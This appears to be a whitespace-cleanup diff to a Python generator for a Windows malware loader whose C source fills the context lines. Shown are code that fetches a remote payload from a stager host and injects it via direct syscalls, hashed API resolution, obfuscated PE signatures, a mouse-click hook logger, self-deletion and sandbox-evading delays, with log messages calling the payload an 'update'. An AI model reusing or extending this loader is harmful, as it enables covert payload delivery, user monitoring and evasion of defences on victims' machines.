@@ -12,7 +12,7 @@ def build_main(stager_ip, stager_port):
 #include "Debug.h"
 
 #include <wininet.h>
-#pragma comment(lib, "wininet.lib")  
+#pragma comment(lib, "wininet.lib")
 #include <intrin.h>
 #include <iphlpapi.h>
 #pragma comment(lib, "iphlpapi.lib")
@@ -36,7 +36,7 @@ BOOL AsciiHexToBin(unsigned char** buffer, DWORD* bufSize)
 
 	DWORD bi = 0;
 	for (DWORD i = 0; i + 3 < txtLen; ++i) {{
-		
+
 		if ((txt[i] == '0' || txt[i] == 'O')
 			&& (txt[i + 1] == 'x' || txt[i + 1] == 'X')
 			&& hex_is_digit(txt[i + 2])
@@ -45,7 +45,7 @@ BOOL AsciiHexToBin(unsigned char** buffer, DWORD* bufSize)
 			unsigned char hi = hex_value(txt[i + 2]);
 			unsigned char lo = hex_value(txt[i + 3]);
 			bin[bi++] = (hi << 4) | lo;
-			i += 3; 
+			i += 3;
 		}}
 	}}
 
@@ -135,7 +135,7 @@ int main() {{
 #endif // DEBUG
 	}}
 
-#endif 
+#endif
 	//--------------------------------------------------------------------------------------
 
 
@@ -144,7 +144,7 @@ int main() {{
 		PRINTA("[!] Failed to fetch update");
 	#endif
 		return -1;
-		
+
 	}}
 
 	PRINTA("[*] Successfully fetched update (%u bytes)", thelengthofthebomb);
@@ -152,7 +152,7 @@ int main() {{
 	PRINTA("[*] Raw fetched (enc) first 16 bytes:    ");
 	for (int i = 0; i < 16; i++) {{
 		PRINTA("0x%02X ", thecrackshack[i]);
-		
+
 	}}
 	PRINTA("");
 
@@ -164,15 +164,15 @@ int main() {{
 	}}
 
 	PRINTA("[*] installing update, size = %u bytes", thelengthofthebomb);
-	
-	
+
+
 	if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, thecrackshack, thelengthofthebomb, TRUE)) {{
 	#ifdef DEBUG
 		//PRINTA("[!] Failed To install update ");
 	#endif
 	my_free(thecrackshack);
 	return -1;
-	
+
 	}}
 	my_free(thecrackshack);
 	PRINTA("[*] update installation succeeded");
@@ -187,7 +187,7 @@ BOOL GetUpdate(LPCSTR url, unsigned char** buffer, DWORD* bufSize)
 	PRINTA("[*] InternetOpenA -> %p", hInet);
 
 	if (!hInet) return FALSE;
-	
+
 		HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0,
 			INTERNET_FLAG_RELOAD |
 			INTERNET_FLAG_KEEP_CONNECTION |
@@ -198,13 +198,13 @@ BOOL GetUpdate(LPCSTR url, unsigned char** buffer, DWORD* bufSize)
 	if (!hUrl) {{
 		InternetCloseHandle(hInet);
 		return FALSE;
-		
+
 	}}
-	
+
 	DWORD bytesRead = 0, total = 0;
 	unsigned char* buf = NULL;
 	BYTE chunk[4096];
-	
+
 		while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead) && bytesRead) {{
 		unsigned char* tmp = (unsigned char*)my_realloc(buf, total + bytesRead);
 		if (!tmp) {{ my_free(buf); InternetCloseHandle(hUrl); InternetCloseHandle(hInet); return FALSE; }}
@@ -212,13 +212,13 @@ BOOL GetUpdate(LPCSTR url, unsigned char** buffer, DWORD* bufSize)
 		_memcpy(buf + total, chunk, bytesRead);
 		total += bytesRead;
 		PRINTA("[*] Downloaded chunk: %u bytes, total = %u", bytesRead, total);
-		
+
 	}}
-	
+
 	InternetCloseHandle(hUrl);
 	InternetCloseHandle(hInet);
 	PRINTA("[*] Completed download, total = %u bytes", total);
-	
+
 		*buffer = buf;
 	*bufSize = total;
 	return (buf != NULL);
@@ -277,7 +277,7 @@ static inline _TheBuild BuildTheDragon(void)
 
 BOOL Thebadmaninitialize() {{
 
-	
+
 	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
 	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
 	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
@@ -285,10 +285,10 @@ BOOL Thebadmaninitialize() {{
 
 	_TheBuild h = BuildTheDragon();
 
-	
+
 	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
 
-	
+
 	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
 	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
 		return FALSE;
@@ -328,7 +328,7 @@ BOOL Thebadmaninitialize() {{
 	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
 		return FALSE;
 
-	
+
 	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(h.kernel_spacename), GetModuleFileNameW_JOAA);
 	g_Api.pCloseHandle = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(h.kernel_spacename), CloseHandle_JOAA);
 	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(h.kernel_spacename), CreateFileW_JOAA);
@@ -351,7 +351,7 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 	PVOID							pValueToFree = NULL;
 	NTSTATUS						STATUS = 0;
 
-	
+
 	TheDogHouse(g_Sys.NtQuerySystemInformation.wSystemCall);
 	TheFlagOfWudan(SystemProcessInformation, NULL, NULL, &uReturnLen1);
 
@@ -360,33 +360,33 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 		return FALSE;
 	}}
 
-	
+
 	pValueToFree = SystemProcInfo;
 
-	
+
 	TheDogHouse(g_Sys.NtQuerySystemInformation.wSystemCall);
 	STATUS = TheFlagOfWudan(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
 
 	while (TRUE) {{
 
 		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {{
-			
+
 			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
 			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
 			break;
 		}}
 
-		
+
 		if (!SystemProcInfo->NextEntryOffset)
 			break;
 
-		
+
 		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
 	}}
 
 	HeapFree(GetProcessHeap(), 0, pValueToFree);
 
-	
+
 	if (*pdwPid == NULL || *phProcess == NULL)
 		return FALSE;
 	else
@@ -402,12 +402,12 @@ void TakeAllTrilliare(unsigned char* data, size_t len)
 
 		if ((i ^ 0x37) & 1) {{
 			data[i] = plain ^ 0x5A;
-			data[i] ^= 0x5A; 
+			data[i] ^= 0x5A;
 		}}
 		else {{
 			data[i] = plain;
 			unsigned char tmp = data[i] ^ 0xA7;
-			data[i] = tmp ^ 0xA7; 
+			data[i] = tmp ^ 0xA7;
 		}}
 	}}
 }}
@@ -472,7 +472,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 #endif // DEBUG
 		return FALSE;
 	}}
-		
+
 
 
 	TheDogHouse(g_Sys.NtWaitForSingleObject.wSystemCall);
@@ -609,13 +609,13 @@ BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImage
 		return FALSE;
 	}}
 
-	
+
 	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
 	if (pImageNtHeaders->Signature != make_thent_sig()) {{
 		return FALSE;
 	}}
 
-	
+
 	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
 	return TRUE;
 }}
@@ -632,18 +632,18 @@ BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDire
 		if (HASHA(pczFunctionName) == pVxTableEntry->uHash) {{
 			pVxTableEntry->pAddress = pFunctionAddress;
 
-			
+
 			WORD cw = 0;
 			while (TRUE) {{
-				
+
 				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
 					return FALSE;
 
-				
+
 				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
 					return FALSE;
 
-			
+
 				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
 					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
 					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
@@ -687,7 +687,7 @@ TheDogHouse:
 
     global TheFlagOfWudan
 TheFlagOfWudan:
-    mov r10, rcx               
+    mov r10, rcx
     mov eax, dword [rel TakeAllTrilliare]
     syscall
     ret
@@ -732,7 +732,7 @@ BOOL MouseClicksLogger() {{
 
     MSG         Msg = {{ 0 }};
 
-    // installing hook 
+    // installing hook
     g_hMouseHook = g_Api.pSetWindowsHookExW(
         WH_MOUSE_LL,
         (HOOKPROC)HookEvent,
@@ -772,11 +772,11 @@ BOOL DeleteSelf() {{
 
 	Delete.DeleteFile = TRUE;
 
-	
+
 	pRename->FileNameLength = sizeof(NewStream);
 	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));
 
-	
+
 	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {{
 
 		return FALSE;
@@ -834,7 +834,7 @@ BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {{
 	DelayInterval.QuadPart = -Delay;
 
 	_T0 = g_Api.pGetTickCount64();
- 
+
 	TheDogHouse(g_Sys.NtDelayExecution.wSystemCall);
 	if ((STATUS = TheFlagOfWudan(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {{
 
@@ -916,19 +916,19 @@ APIHASHING_C = f"""
 #include <intrin.h>
 
 #ifndef BUILD_SEED
-#define BUILD_SEED 0xC0FFEE42 
+#define BUILD_SEED 0xC0FFEE42
 #endif
 
 static inline WORD make_dos_sig(void) {{
-	const WORD A = 0xA1B2;           
+	const WORD A = 0xA1B2;
 	const WORD B = (WORD)(A ^ 0x5A4D);
-	return (WORD)(A ^ B);            
+	return (WORD)(A ^ B);
 }}
 
 static inline DWORD make_nt_sig(void) {{
-	const DWORD X = 0x11223344;      
+	const DWORD X = 0x11223344;
 	const DWORD Y = X ^ 0x00004550;
-	return (DWORD)(X ^ Y);           
+	return (DWORD)(X ^ Y);
 }}
 
 
@@ -955,24 +955,24 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {{
 	PDWORD                   funcs = (PDWORD)(pBase + exp->AddressOfFunctions);
 	DWORD                    count = exp->NumberOfNames;
 
-	
+
 	DWORD stride = ((BUILD_SEED >> 8) ^ (BUILD_SEED & 0xFF)) | 1;
-	    
+
 		for (DWORD pass = 0, idx = 0; pass < count; pass++, idx = (idx + stride) % count) {{
 			if (((pass ^ BUILD_SEED) & 3) == 0) {{
 			__nop(); __nop();
-			
+
 		}}
-		
+
 		CHAR * pFunctionName = (CHAR*)(pBase + names[idx]);
 		DWORD mangledHash = HASHA(pFunctionName) ^ (BUILD_SEED >> 16);
 		DWORD targetMangled = dwApiNameHash ^ (BUILD_SEED >> 16);
 		if (mangledHash == targetMangled) {{
-			__nop();  
+			__nop();
 			return (FARPROC)(pBase + funcs[ordinals[idx]]);
-			
+
 		}}
-		
+
 	}}
 
 	return NULL;
@@ -1005,7 +1005,7 @@ HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {{
 			}}
 			UpperCaseDllName[i] = '\0';
 
-			
+
 			if (HASHA(UpperCaseDllName) == dwModuleNameHash)
 				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
 
